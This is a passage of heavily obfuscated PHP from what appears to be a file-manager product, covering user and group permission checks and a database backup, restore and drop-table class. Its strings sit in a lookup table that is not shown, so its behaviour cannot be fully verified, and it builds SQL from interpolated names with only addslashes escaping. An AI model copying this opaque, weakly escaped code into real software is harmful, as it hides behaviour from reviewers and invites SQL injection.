$­ÃÎöŠ„[2176] . $ƒæ÷µ­ä; static $èãÌÇÌï = array(); if (isset($èãÌÇÌï[$¹Ù²‡…š])) { return $èãÌÇÌï[$¹Ù²‡…š]; } $‡×ÙÏ©­ = Model($­ÃÎöŠ„[594])->getInfo($ƒæ÷µ­ä); $¯ª¹€—™ = $this->userGroupList($¢£ÏŞ); $şÄÄø’  = isset($¯ª¹€—™[$ƒæ÷µ­ä]) ? $¯ª¹€—™[$ƒæ÷µ­ä][$­ÃÎöŠ„[496]] : !1; if ($şÄÄø’  && Model($­ÃÎöŠ„[580])->authCheckAction($şÄÄø’ [$­ÃÎöŠ„[496]], $­ÃÎöŠ„[1984])) { $èãÌÇÌï[$¹Ù²‡…š] = $şÄÄø’ ; return $şÄÄø’ ; } $êèŒÕ« = $this->sourceAuthSelect($‡×ÙÏ©­[$­ÃÎöŠ„[90]][$­ÃÎöŠ„[193]]); $é¯¨ Ê = $êèŒÕ« ? $this->authMake($êèŒÕ«, $¢£ÏŞ) : !1; $¯á¹Ä = $é¯¨ Ê ? $é¯¨ Ê[$­ÃÎöŠ„[549]] : !1; $èãÌÇÌï[$¹Ù²‡…š] = $¯á¹Ä ? $¯á¹Ä : $şÄÄø’ ; return $èãÌÇÌï[$¹Ù²‡…š]; } public function authOwnerApply($ëí¢£€’) { $ìßÚ†Ü‚ =& $_SERVER[³Ôà×Ó]; if (empty($ëí¢£€’[$ìßÚ†Ü‚[496]]) || isset($ëí¢£€’[$ìßÚ†Ü‚[2177]]) && $ëí¢£€’[$ìßÚ†Ü‚[2177]]) { return $ëí¢£€’; } if (AuthModel::authCheckRoot($ëí¢£€’[$ìßÚ†Ü‚[496]][$ìßÚ†Ü‚[497]])) { return $ëí¢£€’; } $ó·ÑÕÙÊ = Model($ìßÚ†Ü‚[1414])->parentLevelArray($ëí¢£€’[$ìßÚ†Ü‚[593]]); $ó·ÑÕÙÊ = array_merge(array($ëí¢£€’[$ìßÚ†Ü‚[193]]), array_reverse($ó·ÑÕÙÊ)); $´ôçš•Ø = $this->sourceAuthSelect($ó·ÑÕÙÊ); $©âÖ“Õ = array(); $º¿½ÛŠ = array(); foreach ($´ôçš•Ø as $Öá—‡˜ï => $µÎì†è˜) { $»…¥úë’ = $this->authFolderOwnerUser($µÎì†è˜); $©âÖ“Õ[$Öá—‡˜ï] = $»…¥úë’; $º¿½ÛŠ = array_merge($º¿½ÛŠ, $»…¥úë’[$ìßÚ†Ü‚[671]]); if ($»…¥úë’[$ìßÚ†Ü‚[2178]]) { break; } } if (count($º¿½ÛŠ) == 0) { $º¿½ÛŠ = $this->authFolderOwnerGroup($ëí¢£€’[$ìßÚ†Ü‚[578]]); } $º¿½ÛŠ = array_unique($º¿½ÛŠ); if (AuthModel::authCheckRoot($ëí¢£€’[$ìßÚ†Ü‚[496]][$ìßÚ†Ü‚[497]])) { $º¿½ÛŠ[] = USER_ID; } $ëí¢£€’[$ìßÚ†Ü‚[496]][$ìßÚ†Ü‚[2179]] = Model($ìßÚ†Ü‚[586])->userListInfo($º¿½ÛŠ); return $ëí¢£€’; } private function authFolderOwnerGroup($ÔñÕ“ãß) { $©—Ôáú° =& $_SERVER[³Ôà×Ó]; $ßË†œì‰ = Model($©—Ôáú°[2057])->where(array($©—Ôáú°[1963] => $ÔñÕ“ãß))->select(); $ì“€™‹· = array(); if (!$ßË†œì‰) { return $ì“€™‹·; } foreach ($ßË†œì‰ as $» º¸›¸) { $†õëºÌö = $this->authInfo($» º¸›¸); if (AuthModel::authCheckRoot($†õëºÌö[$©—Ôáú°[496]])) { $ì“€™‹·[] = $» º¸›¸[$©—Ôáú°[1765]]; } } return $ì“€™‹·; } private function authFolderOwnerUser($¿ÉºŸ×) { $…Íú­† =& $_SERVER[³Ôà×Ó]; $ˆ³©« = array(); $Ş¬ÌÆŸ = !1; foreach ($¿ÉºŸ× as $Ğ¬ç†¡Ò) { $œƒøÚ™ = $this->authInfo($Ğ¬ç†¡Ò); if ($Ğ¬ç†¡Ò[$…Íú­†[578]] == $…Íú­†[228]) { $Ş¬ÌÆŸ = !0; } if ($Ğ¬ç†¡Ò[$…Íú­†[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($œƒøÚ™[$…Íú­†[496]])) { $ˆ³©«[] = $Ğ¬ç†¡Ò[$…Íú­†[578]]; } } } return array($…Íú­†[671] => $ˆ³©«, $…Íú­†[2178] => $Ş¬ÌÆŸ); } public function authMake($¸»ÍáüÈ, $»Ê¨Ë®Ö = false) { $ŒĞ¢©İ =& $_SERVER[³Ôà×Ó]; $˜ÍĞ´ÍÑ = $this->authArrayCheck($¸»ÍáüÈ, $»Ê¨Ë®Ö); if ($˜ÍĞ´ÍÑ[$ŒĞ¢©İ[2180]]) { $˜ÍĞ´ÍÑ[$ŒĞ¢©İ[2180]] = $this->sourceAuthInfo($˜ÍĞ´ÍÑ[$ŒĞ¢©İ[2180]]); } return $˜ÍĞ´ÍÑ; } public function authArrayCheck($Ø´ıãŸì, $“Á½ê—ò = false) { $ôÀˆĞ®ã =& $_SERVER[³Ôà×Ó]; if (!$Ø´ıãŸì) { return array($ôÀˆĞ®ã[497] => 0, $ôÀˆĞ®ã[549] => !1); } $“Á½ê—ò = $“Á½ê—ò ? $“Á½ê—ò : USER_ID; $Ë£Ã¼ØÀ = 0; $ÑˆŸã×µ = 0; $øÓ­©Ö = 0; $©­öÛÁ = 0; $‚¯˜é¦ñ = 0; $ãäÍÜ‰ = 0; $™ıéâì = 1000; $ÄÓÊ›¦ = 0; $³ÀâŸ»ª = 0; $¿Ö®Ç²š = 0; $ù©…İç¥ = 0; $‚·°˜¸ = array($ôÀˆĞ®ã[193] => 0); foreach ($Ø´ıãŸì as $‚·°˜¸) { $‚ã„Äªü = $this->authInfo($‚·°˜¸); if (!$‚ã„Äªü) { continue; } $÷Õ©“ú¨ = $‚·°˜¸[$ôÀˆĞ®ã[578]]; $ªßù•­Ö = intval($‚ã„Äªü[$ôÀˆĞ®ã[496]]); if ($‚·°˜¸[$ôÀˆĞ®ã[190]] == SourceModel::TYPE_USER && $÷Õ©“ú¨ == $“Á½ê—ò) { $Ë£Ã¼ØÀ = !0; $øÓ­©Ö = $‚ã„Äªü; $ÑˆŸã×µ = $ªßù•­Ö; } else { if ($‚·°˜¸[$ôÀˆĞ®ã[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($÷Õ©“ú¨, $“Á½ê—ò)) { $©­öÛÁ = !0; $Ş¯°Şã = $this->groupStepToUserGroup($÷Õ©“ú¨, $“Á½ê—ò); if ($Ş¯°Şã < $™ıéâì) { $™ıéâì = $Ş¯°Şã; $‚¯˜é¦ñ = $ªßù•­Ö; $ãäÍÜ‰ = $‚ã„Äªü; $ÄÓÊ›¦ = $÷Õ©“ú¨; } if ($Ş¯°Şã == $™ıéâì && $ªßù•­Ö >= $‚¯˜é¦ñ) { $‚¯˜é¦ñ = $ªßù•­Ö; $ãäÍÜ‰ = $‚ã„Äªü; $ÄÓÊ›¦ = $÷Õ©“ú¨; } } else { if ($÷Õ©“ú¨ == $ôÀˆĞ®ã[228]) { $³ÀâŸ»ª = !0; $ù©…İç¥ = $‚ã„Äªü; $¿Ö®Ç²š = $ªßù•­Ö; } } } } if ($Ë£Ã¼ØÀ) { $éÕÔˆ” = $ÑˆŸã×µ; $‚ã„Äªü = $øÓ­©Ö; $£êÀßÔ­ = LNG($ôÀˆĞ®ã[2181]); } else { if ($©­öÛÁ) { $éÕÔˆ” = $‚¯˜é¦ñ; $‚ã„Äªü = $ãäÍÜ‰; $Â÷„ø¨Ÿ = Model($ôÀˆĞ®ã[594])->getInfo($ÄÓÊ›¦); $£êÀßÔ­ = $ôÀˆĞ®ã[176] . $Â÷„ø¨Ÿ[$ôÀˆĞ®ã[598]] . $ôÀˆĞ®ã[2182] . LNG($ôÀˆĞ®ã[2183]); } else { if ($³ÀâŸ»ª) { $éÕÔˆ” = $¿Ö®Ç²š; $‚ã„Äªü = $ù©…İç¥; $£êÀßÔ­ = LNG($ôÀˆĞ®ã[2153]); } else { $éÕÔˆ” = 0; $‚ã„Äªü = !1; $£êÀßÔ­ = $ôÀˆĞ®ã[12]; } } } $Ÿ¶ĞÏ± = array($ôÀˆĞ®ã[2173] => intval($éÕÔˆ”), $ôÀˆĞ®ã[2156] => $‚ã„Äªü, $ôÀˆĞ®ã[2174] => $£êÀßÔ­, $ôÀˆĞ®ã[2165] => $‚·°˜¸[$ôÀˆĞ®ã[193]]); return $Ÿ¶ĞÏ±; } private function groupContainUser($º½®ùš¸, $ç‚„ä£ = false) { return in_array($º½®ùš¸, $this->userGroupParents($ç‚„ä£)); } private function groupStepToUserGroup($é–ßªú®, $¯ñ Š¹¿ = false) { $èÀ¶Á× =& $_SERVER[³Ôà×Ó]; $€¡üÏáù = $this->userGroupList($¯ñ Š¹¿); $şÔ£û¦œ = 1000; $Ü‹ ‘İ§ = $GLOBALS[$èÀ¶Á×[6]][$èÀ¶Á×[92]][$èÀ¶Á×[2070]] == 1; $¸ôğ³© = $Ü‹ ‘İ§ ? 3 : 2; foreach ($€¡üÏáù as $À™ƒÙ¾º) { if ($À™ƒÙ¾º[$èÀ¶Á×[1963]] == $é–ßªú®) { return 0; } $üŠåœáã = explode($èÀ¶Á×[50], trim($À™ƒÙ¾º[$èÀ¶Á×[593]], $èÀ¶Á×[50])); if ($üŠåœáã[0] == $èÀ¶Á×[228] && count($üŠåœáã) > $¸ôğ³©) { $‹ÀÙØ†ú = array_reverse(array_slice($üŠåœáã, $¸ôğ³©)); $¾ÙÀğöÍ = array_search($é–ßªú®, $‹ÀÙØ†ú); if ($¾ÙÀğöÍ !== !1 && $¾ÙÀğöÍ + 1 <= $şÔ£û¦œ) { $şÔ£û¦œ = $¾ÙÀğöÍ + 1; } } } return $şÔ£û¦œ; } private function userGroupList($ÑÌ‡ÎØ = false) { $’‘‹‚†Ş =& $_SERVER[³Ôà×Ó]; static $»¥şÉ£ = array(); if (isset($»¥şÉ£[$ÑÌ‡ÎØ])) { return $»¥şÉ£[$ÑÌ‡ÎØ]; } $ğÌ öœ¹ = Model($’‘‹‚†Ş[607])->getInfo($ÑÌ‡ÎØ); $»¥şÉ£[$ÑÌ‡ÎØ] = array_to_keyvalue($ğÌ öœ¹[$’‘‹‚†Ş[2154]], $’‘‹‚†Ş[1963]); return $»¥şÉ£[$ÑÌ‡ÎØ]; } public function userGroupParents($œÊÓ¨â) { $ïÀ¦µÏî =& $_SERVER[³Ôà×Ó]; static $æ÷æ‡ = array(); $œÊÓ¨â = $œÊÓ¨â ? $œÊÓ¨â : USER_ID; if (isset($æ÷æ‡[$œÊÓ¨â])) { return $æ÷æ‡[$œÊÓ¨â]; } $…éÒËÇ = $this->userGroupList($œÊÓ¨â); $×¼ÇËÛº = array(); $½¿İ™âñ = $GLOBALS[$ïÀ¦µÏî[6]][$ïÀ¦µÏî[92]][$ïÀ¦µÏî[2070]] == 1; $Üî¨ëŠÒ = $½¿İ™âñ ? 3 : 2; foreach ($…éÒËÇ as $ùÁ˜ò¯) { $¹ô¬¶Ù† = array($ùÁ˜ò¯[$ïÀ¦µÏî[1963]]); $ÄÎÅƒÒ¾ = explode($ïÀ¦µÏî[50], trim($ùÁ˜ò¯[$ïÀ¦µÏî[593]], $ïÀ¦µÏî[50])); if ($ÄÎÅƒÒ¾[0] == $ïÀ¦µÏî[228] && count($ÄÎÅƒÒ¾) > $Üî¨ëŠÒ) { $î¿ûŞ¨ø = array_slice($ÄÎÅƒÒ¾, $Üî¨ëŠÒ); $¹ô¬¶Ù† = array_merge($¹ô¬¶Ù†, array_reverse($î¿ûŞ¨ø)); } $×¼ÇËÛº = array_merge($×¼ÇËÛº, $¹ô¬¶Ù†); } $æ÷æ‡[$œÊÓ¨â] = array_unique($×¼ÇËÛº); return $æ÷æ‡[$œÊÓ¨â]; } public function authTargetInfoMake($Éİ»¤ôÒ) { $ŒÓü¿ıò =& $_SERVER[³Ôà×Ó]; $âÙ‘ÔƒÓ = array(); $ì¨çÍôˆ = array(); foreach ($Éİ»¤ôÒ as $ĞÀ‚–ÔÔ) { if ($ĞÀ‚–ÔÔ[$ŒÓü¿ıò[190]] == SourceModel::TYPE_USER) { $âÙ‘ÔƒÓ[] = intval($ĞÀ‚–ÔÔ[$ŒÓü¿ıò[578]]); } else { if ($ĞÀ‚–ÔÔ[$ŒÓü¿ıò[190]] == SourceModel::TYPE_GROUP) { $ì¨çÍôˆ[] = intval($ĞÀ‚–ÔÔ[$ŒÓü¿ıò[578]]); } } } if ($âÙ‘ÔƒÓ) { $âÙ‘ÔƒÓ = Model($ŒÓü¿ıò[586])->userListInfo($âÙ‘ÔƒÓ); } if ($ì¨çÍôˆ) { $úœ§â˜ = array($ŒÓü¿ıò[2055] => array($ŒÓü¿ıò[501], $ì¨çÍôˆ)); $ì¨çÍôˆ = Model($ŒÓü¿ıò[594])->field($ŒÓü¿ıò[2184])->where($úœ§â˜)->select(); $ì¨çÍôˆ = array_to_keyvalue($ì¨çÍôˆ, $ŒÓü¿ıò[1963]); } return array($ŒÓü¿ıò[2185] => $âÙ‘ÔƒÓ, $ŒÓü¿ıò[2186] => $ì¨çÍôˆ); } public function authInfo($Ê¡úê) { $€ê“ñó§ =& $_SERVER[³Ôà×Ó]; if ($Ê¡úê[$€ê“ñó§[2071]]) { $Œ¿¹ÃƒÇ = Model($€ê“ñó§[580])->listData($Ê¡úê[$€ê“ñó§[2071]]); if (!$Œ¿¹ÃƒÇ) { return !1; $«‡ƒîĞ = Model($€ê“ñó§[580])->listData(); $µŸäİ¹… = array_filter_by_field($«‡ƒîĞ, $€ê“ñó§[496], $€ê“ñó§[228]); return $µŸäİ¹…; } $ó–ÚÏ¥Á = array_field_key($Œ¿¹ÃƒÇ, array($€ê“ñó§[484], $€ê“ñó§[32], $€ê“ñó§[496], $€ê“ñó§[1986], $€ê“ñó§[1987])); $ó–ÚÏ¥Á[$€ê“ñó§[2187]] = $Ê¡úê; return $ó–ÚÏ¥Á; } else { return array($€ê“ñó§[502] => 0, $€ê“ñó§[1969] => $Ê¡úê[$€ê“ñó§[2131]], $€ê“ñó§[503] => $€ê“ñó§[12], $€ê“ñó§[1986] => $€ê“ñó§[2188]); } } } goto FƒœŸ“Š™ğ; B‘ŞÅ£¢÷Ò: class DbManage { function __construct($ú‹ûì = array()) { $²ê”ÄÅë =& $_SERVER[³Ôà×Ó]; if (empty($ú‹ûì)) { $ú‹ûì = $GLOBALS[$²ê”ÄÅë[6]][$²ê”ÄÅë[21]]; } $this->database = $ú‹ûì; } public function model($“â®â©Ô = '') { return new ModelBase($“â®â©Ô, $_SERVER[³Ôà×Ó][12], $this->database); } public function db($•¶§Œõ© = false) { $Õ«Şœ€Á =& $_SERVER[³Ôà×Ó]; $õÏÌ¤ï = array_change_key_case($this->database); if ($this->dbType() == $Õ«Şœ€Á[13] || !$•¶§Œõ©) { return $this->model()->db(); } $ã¡óŠ Ü = $õÏÌ¤ï[$Õ«Şœ€Á[1047]]; $õÏÌ¤ï[$Õ«Şœ€Á[1047]] = $Õ«Şœ€Á[12]; if ($õÏÌ¤ï[$Õ«Şœ€Á[1042]] == $Õ«Şœ€Á[1039]) { $Ô àêã = $õÏÌ¤ï[$Õ«Şœ€Á[1048]]; $õÏÌ¤ï[$Õ«Şœ€Á[1048]] = substr($Ô àêã, 0, strrpos($Ô àêã, $Õ«Şœ€Á[1134])); } $this->database = $õÏÌ¤ï; $ğÏ¡¡™ì = $this->model()->db(); try { $ñÚ¾‚î× = $ğÏ¡¡™ì->execute("\x73\x68\157\167\x20\x64\x61\x74\x61\x62\x61\x73\145\163\x20\154\151\153\145\40\47{$ã¡óŠ Ü}\x27"); } catch (Exception $çıª¾µ¦) { } if (!$ñÚ¾‚î×) { $ğÏ¡¡™ì->execute("\143\x72\x65\x61\x74\x65\40\x64\x61\164\141\x62\x61\163\x65\x20\140{$ã¡óŠ Ü}\x60"); } $õÏÌ¤ï[$Õ«Şœ€Á[1047]] = $ã¡óŠ Ü; if ($õÏÌ¤ï[$Õ«Şœ€Á[1042]] == $Õ«Şœ€Á[1039]) { $õÏÌ¤ï[$Õ«Şœ€Á[1048]] .= $Õ«Şœ€Á[1134] . $ã¡óŠ Ü; } $this->database = $õÏÌ¤ï; $ğÏ¡¡™ì->execute("\165\x73\x65\40\140{$ã¡óŠ Ü}\140"); return $ğÏ¡¡™ì; } public function createTable($Ú–ãğ, &$÷’ƒî”Ñ) { $¾‰×Ç¨× =& $_SERVER[³Ôà×Ó]; if (!IO::exist($Ú–ãğ)) { ActionCall($¾‰×Ç¨×[1135], !0, 0); show_json(LNG($¾‰×Ç¨×[1136]), !1); } $Çšã‚¨è = $this->model()->db(); $Ñ—”©×Ì = sqlSplit(IO::getContent($Ú–ãğ)); foreach ($Ñ—”©×Ì as $şı¡ô¶ñ) { $™áÃàÃ™ = stripos($şı¡ô¶ñ, $¾‰×Ç¨×[1137]) === 0; if ($™áÃàÃ™) { $÷’ƒî”Ñ->task[$¾‰×Ç¨×[1138]] += 1; } $Çšã‚¨è->execute($şı¡ô¶ñ); if ($™áÃàÃ™) { preg_match($¾‰×Ç¨×[1139], $şı¡ô¶ñ, $¡éµ…û‹); $÷’ƒî”Ñ->task[$¾‰×Ç¨×[1140]] = $¡éµ…û‹[1]; $÷’ƒî”Ñ->update(1); } } } public function insertTable($­×­ªíá, &$®¡€Ñ¡ï) { $úÒ°÷“ =& $_SERVER[³Ôà×Ó]; $·ë®çé‰ = $this->model()->db(); $„òöŒª‰ = $ãÖ«ÀŸ ? array($ãÖ«ÀŸ) : $·ë®çé‰->getTables(); foreach ($­×­ªíá as $‚“ÍÎØã) { $ãÖ«ÀŸ = basename($‚“ÍÎØã, $úÒ°÷“[863]); if (!in_array($ãÖ«ÀŸ, $„òöŒª‰)) { continue; } $®¡€Ñ¡ï->task[$úÒ°÷“[1140]] = $ãÖ«ÀŸ; if (get_filesize($‚“ÍÎØã) == 0) { continue; } $Í€ıå” = $this->sqlToDb($‚“ÍÎØã, $®¡€Ñ¡ï); if (!$Í€ıå”) { ActionCall($úÒ°÷“[1135], !0, 0); show_json(LNG($úÒ°÷“[1141]) . "\133{$ãÖ«ÀŸ}\135", !1); } } } public function sqlFromDb($å ÷Ğõ, $³êÀÊ»­, &$ø“•ÒğË, $®ï£²ìı = '') { if ($ø“•ÒğË) { $ø“•ÒğË->task[$_SERVER[³Ôà×Ó][1140]] = $å ÷Ğõ; } $û¯²˜½­ = $this->model($å ÷Ğõ); $ŠŒÅÓ«— = 0; $×Â¨À·Ã = 0; $¦Âª×§ = 10000; $¾İ§ğÕ¾ = fopen($³êÀÊ»­, $_SERVER[³Ôà×Ó][1142]); $•ÍÙöò‡ = $û¯²˜½­->getPk(); $®†øşÃ” = $û¯²˜½­->getDbFields(); $¹Ìƒş¦Ÿ = $_SERVER[³Ôà×Ó][12]; if ($GLOBALS[$_SERVER[³Ôà×Ó][862]] && in_array($å ÷Ğõ, array($_SERVER[³Ôà×Ó][1143], $_SERVER[³Ôà×Ó][1144]))) { $¹Ìƒş¦Ÿ = $å ÷Ğõ; } do { $ÙÜ¾’â = array($•ÍÙöò‡ => array($_SERVER[³Ôà×Ó][1089], $×Â¨À·Ã)); $Ó˜Í•… = $û¯²˜½­->where($ÙÜ¾’â)->field($®†øşÃ”)->order($•ÍÙöò‡ . $_SERVER[³Ôà×Ó][1145])->limit($¦Âª×§)->select(); $Ó˜Í•… = !empty($Ó˜Í•…) ? $Ó˜Í•… : array(); if (!($¨ÚşœÆû = count($Ó˜Í•…))) { break; } $èÃ•Ä‹ = end($Ó˜Í•…); $×Â¨À·Ã = $èÃ•Ä‹[$•ÍÙöò‡]; $´˜Õ¸Ç = array(); foreach ($Ó˜Í•… as $™‚€³ÓÄ) { if ($¹Ìƒş¦Ÿ) { if ($å ÷Ğõ == $_SERVER[³Ôà×Ó][1143]) { if ($™‚€³ÓÄ[$_SERVER[³Ôà×Ó][33]] == $_SERVER[³Ôà×Ó][1146]) { $¸»Ô¨ó÷ = json_decode($™‚€³ÓÄ[$_SERVER[³Ôà×Ó][459]], !0); if ($¸»Ô¨ó÷[$_SERVER[³Ôà×Ó][32]] == $GLOBALS[$_SERVER[³Ôà×Ó][862]] && $¸»Ô¨ó÷[$_SERVER[³Ôà×Ó][825]] != 1) { continue; } } } else { if ($™‚€³ÓÄ[$_SERVER[³Ôà×Ó][33]] == $_SERVER[³Ôà×Ó][1147] && $™‚€³ÓÄ[$_SERVER[³Ôà×Ó][97]] == $_SERVER[³Ôà×Ó][857]) { continue; } } } if ($®ï£²ìı) { $™‚€³ÓÄ[$_SERVER[³Ôà×Ó][87]] = "\x7b\x69\157\x3a{$®ï£²ìı}\175" . substr($™‚€³ÓÄ[$_SERVER[³Ôà×Ó][87]], strlen("\173\151\157\x3a{$™‚€³ÓÄ[$_SERVER[³Ôà×Ó][892]]}\x7d")); $™‚€³ÓÄ[$_SERVER[³Ôà×Ó][892]] = $®ï£²ìı; } $´˜Õ¸Ç[] = $_SERVER[³Ôà×Ó][1148] . $this->sqlEncode($™‚€³ÓÄ) . $_SERVER[³Ôà×Ó][1149]; } $çš»¢ªâ = "\111\x4e\123\105\x52\124\x20\x49\116\124\x4f\x20\x60{$å ÷Ğõ}\x60\x20\x28\x60" . implode($_SERVER[³Ôà×Ó][1150], $®†øşÃ”) . $_SERVER[³Ôà×Ó][1151]; fwrite($¾İ§ğÕ¾, $çš»¢ªâ . implode($_SERVER[³Ôà×Ó][1152], $´˜Õ¸Ç) . $_SERVER[³Ôà×Ó][74] . PHP_EOL); $ŠŒÅÓ«— += $¨ÚşœÆû; if ($ø“•ÒğË) { $ø“•ÒğË->update($¨ÚşœÆû); } } while ($¦Âª×§ == $¨ÚşœÆû); fclose($¾İ§ğÕ¾); return $ŠŒÅÓ«—; } public function sqlToDb($Ì¾‚™•, &$“ˆ„ˆÇ¢) { $ª½ÆÆ‡ğ =& $_SERVER[³Ôà×Ó]; $ä¤Ş“¾¤ = $this->model()->db(); $ÇÛöÙØç = @fopen($Ì¾‚™•, $ª½ÆÆ‡ğ[1153]); if (!$ÇÛöÙØç) { return !1; } $À´ıˆ¸¸ = 0; $¸Ññ‹ñ‘ = $ª½ÆÆ‡ğ[12]; $á€–¡šê = array(); $¾ã”§İ = $this->dbType(); $Ü Â¼ôÖ = $¾ã”§İ == $ª½ÆÆ‡ğ[13] ? 500 : 2000; $…±¬åò = basename($Ì¾‚™•, $ª½ÆÆ‡ğ[863]); $£ÙÁ”¦Õ = 0; $áé¢íš = 4194304; while (!feof($ÇÛöÙØç)) { $½ùóÚÁ° = trim(fgets($ÇÛöÙØç)); if (!$½ùóÚÁ°) { continue; } $®ç“—ç… = $this->sqlDecode($½ùóÚÁ°, $¾ã”§İ, $…±¬åò); if (stripos($®ç“—ç…, $ª½ÆÆ‡ğ[440]) === 0) { if (!$¸Ññ‹ñ‘) { $¸Ññ‹ñ‘ = $®ç“—ç… . $ª½ÆÆ‡ğ[53]; } continue; } if ($“ˆ„ˆÇ¢) { $“ˆ„ˆÇ¢->task[$ª½ÆÆ‡ğ[1138]] += 1; } $À´ıˆ¸¸++; $á€–¡šê[] = rtrim(rtrim(trim($®ç“—ç…), $ª½ÆÆ‡ğ[50]), $ª½ÆÆ‡ğ[74]); $¶ß¶‡³ = null; $»µµ‰¿¨ = strlen($®ç“—ç…); $£ÙÁ”¦Õ += $»µµ‰¿¨; $ïĞºŞ·å = strlen($¸Ññ‹ñ‘) + $£ÙÁ”¦Õ + (count($á€–¡šê) - 1); if ($ïĞºŞ·å >= $áé¢íš) { $¶ß¶‡³ = array_pop($á€–¡šê); if ($À´ıˆ¸¸ > 1) { $À´ıˆ¸¸--; } } if ($À´ıˆ¸¸ >= $Ü Â¼ôÖ || $¶ß¶‡³) { $®ç“—ç… = $¸Ññ‹ñ‘ . implode($ª½ÆÆ‡ğ[50], $á€–¡šê); if (!$ä¤Ş“¾¤->execute($®ç“—ç…)) { return !1; } if ($“ˆ„ˆÇ¢) { $“ˆ„ˆÇ¢->update($À´ıˆ¸¸); } $á€–¡šê = array(); $À´ıˆ¸¸ = 0; $£ÙÁ”¦Õ = 0; if ($¶ß¶‡³) { $á€–¡šê = array($¶ß¶‡³); $À´ıˆ¸¸ = 1; $£ÙÁ”¦Õ = $»µµ‰¿¨; } } } fclose($ÇÛöÙØç); if (!empty($á€–¡šê)) { $®ç“—ç… = $¸Ññ‹ñ‘ . implode($ª½ÆÆ‡ğ[50], $á€–¡šê); if (!$ä¤Ş“¾¤->execute($®ç“—ç…)) { return !1; } if ($“ˆ„ˆÇ¢) { $“ˆ„ˆÇ¢->update($À´ıˆ¸¸); } } return !0; } public function dropTable($Õ—§âöº = null) { $‹ÖşŒ = $this->model()->db(); $ÀÅÏ“ŠÆ = $Õ—§âöº ? array($Õ—§âöº) : $‹ÖşŒ->getTables(); if (!$ÀÅÏ“ŠÆ) { return; } foreach ($ÀÅÏ“ŠÆ as $Õ—§âöº) { if ($Õ—§âöº) { $Õ—§âöº = strtolower($Õ—§âöº); } else { continue; } $‹ÖşŒ->execute("\144\x72\157\160\40\164\141\x62\x6c\145\40\151\146\40\145\x78\151\163\x74\163\40\140{$Õ—§âöº}\140"); } } private function sqlEncode($Ş»Ñ¢Ü„) { $áëª¸Œù =& $_SERVER[³Ôà×Ó]; $ñ€¥îµ = array(); foreach ($Ş»Ñ¢Ü„ as $¹¤îş™Ï) { if (is_array($¹¤îş™Ï)) { $¹¤îş™Ï = json_encode_force($¹¤îş™Ï); } $¹¤îş™Ï = addslashes($¹¤îş™Ï); $¹¤îş™Ï = str_replace(array($áëª¸Œù[1154], $áëª¸Œù[262], $áëª¸Œù[418]), array($áëª¸Œù[1155], $áëª¸Œù[1156], $áëª¸Œù[1157]), $¹¤îş™Ï); $ñ€¥îµ[] = $¹¤îş™Ï; } return $áëª¸Œù[58] . implode($áëª¸Œù[1158], $ñ€¥îµ) . $áëª¸Œù[58]; } private function sqlDecode($İ®š³òÊ, $ÅÄ±–Ë, $Š›’ˆóê = '') { $á½È³Úò =& $_SERVER[³Ôà×Ó]; $İ®š³òÊ = str_replace(array($á½È³Úò[1155], $á½È³Úò[1156], $á½È³Úò[1157]), array($á½È³Úò[1154], $á½È³Úò[262], $á½È³Úò[418]), $İ®š³òÊ); if ($ÅÄ±–Ë == $á½È³Úò[13]) { $İ®š³òÊ = str_ireplace($á½È³Úò[1159], $á½È³Úò[59], $İ®š³òÊ); $İ®š³òÊ = stripslashes($İ®š³òÊ); } return preg_replace($á½È³Úò[1160], $á½È³Úò[12], $İ®š³òÊ); if ($ÅÄ±–Ë == $á½È³Úò[13]) { return $Š›’ˆóê != $á½È³Úò[1161] ? stripslashes($İ®š³òÊ) : $İ®š³òÊ; } if ($Š›’ˆóê == $á½È³Úò[1161]) { $İ®š³òÊ = str_replace($á½È³Úò[1162], $á½È³Úò[121], stripslashes($İ®š³òÊ)); } return $İ®š³òÊ; } public function getSqlFile($öÉ Ğ§Ì = '') { $‘”ËÕ”¬ =& $_SERVER[³Ôà×Ó]; $¡Ğù¦Ş© = $this->dbType(!0); $©„÷± = CONTROLLER_DIR . "\x69\156\x73\164\x61\x6c\x6c\x2f\x64\141\x74\x61\x2f{$¡Ğù¦Ş©}\x2e\163\x71\x6c"; $‡ñßíş¬ = file_get_contents($©„÷±); $Û»‹·óÙ = $‘”ËÕ”¬[1163] . ($¡Ğù¦Ş© == $‘”ËÕ”¬[879] ? $‘”ËÕ”¬[1164] : $‘”ËÕ”¬[1165]) . $‘”ËÕ”¬[1166]; preg_match_all($Û»‹·óÙ, $‡ñßíş¬, $¨ ›ËÜ»); $ğ«¾–¦¾ = $¨ ›ËÜ»[1]; $øæÛû¢“ = $this->model()->db(); $ßí®Øå = $øæÛû¢“->getTables(); $Ôó¾î³´ = TEMP_FILES . $‘”ËÕ”¬[1167] . date($‘”ËÕ”¬[272]) . $‘”ËÕ”¬[8]; del_dir($Ôó¾î³´); mk_dir($Ôó¾î³´); $¿¨Œ¨Â¨ = $Ôó¾î³´ . $‘”ËÕ”¬[1168]; $­âô‚ëÌ = $Ôó¾î³´ . $‘”ËÕ”¬[1169]; $íúíøŸ› = $¡Ğù¦Ş© == $‘”ËÕ”¬[13] ? $‘”ËÕ”¬[879] : $‘”ËÕ”¬[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\x61\154\154\57\144\141\x74\x61\57{$íúíøŸ›}\x2e\163\161\154", $Ôó¾î³´); @touch($Ôó¾î³´ . $¡Ğù¦Ş© . $‘”ËÕ”¬[863]); $úÀöòï = fopen($¿¨Œ¨Â¨, $‘”ËÕ”¬[1142]); $’Ä¤çµÕ = fopen($­âô‚ëÌ, $‘”ËÕ”¬[1142]); if ($¡Ğù¦Ş© == $‘”ËÕ”¬[13]) { $ßí®Øå = array_diff($ßí®Øå, array($‘”ËÕ”¬[855], $‘”ËÕ”¬[856])); $°‚ğ±Ø˜ = array($‘”ËÕ”¬[1170], $‘”ËÕ”¬[1171], $‘”ËÕ”¬[1172]); fwrite($’Ä¤çµÕ, implode(PHP_EOL, $°‚ğ±Ø˜) . PHP_EOL . PHP_EOL); foreach ($ßí®Øå as $”’ÌË®à) { $›Äº–áæ = $this->sqlFromSqlite($”’ÌË®à); if (!$›Äº–áæ[$‘”ËÕ”¬[13]]) { continue; } fwrite($’Ä¤çµÕ, $›Äº–áæ[$‘”ËÕ”¬[13]] . PHP_EOL . PHP_EOL); if (!in_array($”’ÌË®à, $ğ«¾–¦¾)) { fwrite($úÀöòï, $›Äº–áæ[$‘”ËÕ”¬[879]] . PHP_EOL . PHP_EOL); } } } else { foreach 